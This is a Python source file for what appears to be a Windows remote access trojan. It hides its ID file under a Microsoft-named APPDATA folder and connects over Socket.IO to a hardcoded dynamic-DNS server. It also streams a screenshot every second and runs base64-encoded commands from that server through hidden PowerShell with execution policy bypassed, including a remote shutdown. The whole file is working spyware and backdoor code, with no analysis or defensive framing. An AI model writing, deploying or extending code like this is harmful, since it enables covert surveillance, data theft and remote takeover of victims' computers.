import os
import sys
import time
import io
import base64
import ctypes
import threading
import subprocess
from PIL import ImageGrab, Image
import socketio

# Single Instance Enforcement via Windows Mutex
kernel32 = ctypes.windll.kernel32
mutex = kernel32.CreateMutexW(None, False, "run_py_mutex")
if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
    sys.exit(0)

# Server Configuration & Client ID
VPS_URL = os.getenv("VPS_URL", "http://runx.ddns.net")
ID_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft", "run", "run.txt")

os.makedirs(os.path.dirname(ID_PATH), exist_ok=True)
if os.path.exists(ID_PATH):
    with open(ID_PATH, "r", encoding="utf-8") as f:
        raw = f.read().strip()
    unique_id = raw[:8] if len(raw) >= 8 else raw
else:
    import uuid

    unique_id = str(uuid.uuid4())[:8]
    with open(ID_PATH, "w", encoding="utf-8") as f:
        f.write(unique_id)

unique_user = f"{os.getenv('USERNAME')}-{unique_id}-W"

# SocketIO Client Initialization
sio = socketio.Client(reconnection=True, reconnection_delay=2)

capture_active = False
capture_thread = None


def capture_loop():
    global capture_active
    user_folder = os.path.join(os.getenv("TEMP"), "frames-repo", unique_user)
    os.makedirs(user_folder, exist_ok=True)

    while capture_active:
        try:
            timestamp = (
                time.strftime("%Y%m%d%H%M%S") + f"{int(time.time() * 1000) % 1000:03d}"
            )
            filename = f"{timestamp}.jpg"

            # Native screen grab & processing with Pillow
            img = ImageGrab.grab()
            w, h = img.size
            img_resized = img.resize(
                (w // 2, h // 2), Image.Resampling.LANCZOS
            ).convert("L")

            buf = io.BytesIO()
            img_resized.save(buf, format="JPEG", quality=80)
            img_bytes = buf.getvalue()
            b64_img = base64.b64encode(img_bytes).decode("utf-8")

            if sio.connected:
                sio.emit(
                    "upload_frame",
                    {"username": unique_user, "filename": filename, "image": b64_img},
                )
        except Exception as e:
            pass
        time.sleep(1)


@sio.event
def connect():
    print(f"Connected to WebSocket server as {unique_user}")
    sio.emit("register", {"username": unique_user})


@sio.event
def disconnect():
    print("Disconnected from WebSocket server")


@sio.on("exec_command")
def on_exec_command(data):
    cmd_raw = data.get("cmd", "")
    visible = data.get("visible", 0)

    if not cmd_raw:
        return

    try:
        decoded_cmd = base64.b64decode(cmd_raw).decode("utf-8")
    except Exception:
        decoded_cmd = cmd_raw

    print(f"Executing command: {decoded_cmd}")

    if "panic" in decoded_cmd.lower():
        sys.exit(0)
    elif "altf4" in decoded_cmd.lower():
        subprocess.Popen(
            ["shutdown", "/s", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW
        )
    else:
        creation_flags = (
            subprocess.CREATE_NEW_CONSOLE if visible else subprocess.CREATE_NO_WINDOW
        )
        cmd_str = decoded_cmd.strip()
        if cmd_str.lower().startswith("powershell"):
            subprocess.Popen(cmd_str, shell=True, creationflags=creation_flags)
        else:
            subprocess.Popen(
                [
                    "powershell.exe",
                    "-NoProfile",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-Command",
                    cmd_str,
                ],
                creationflags=creation_flags,
            )


@sio.on("set_capture")
def on_set_capture(data):
    global capture_active, capture_thread
    should_capture = bool(data.get("capture", False))

    if should_capture and not capture_active:
        capture_active = True
        capture_thread = threading.Thread(target=capture_loop, daemon=True)
        capture_thread.start()
    elif not should_capture and capture_active:
        capture_active = False


def heartbeat_loop():
    while True:
        if sio.connected:
            try:
                sio.emit("heartbeat", {"username": unique_user})
            except Exception:
                pass
        time.sleep(5)


def main():
    hb_thread = threading.Thread(target=heartbeat_loop, daemon=True)
    hb_thread.start()

    while True:
        try:
            if not sio.connected:
                sio.connect(
                    VPS_URL, wait_timeout=10, transports=["websocket", "polling"]
                )
        except Exception:
            pass
        time.sleep(5)


if __name__ == "__main__":
    main()
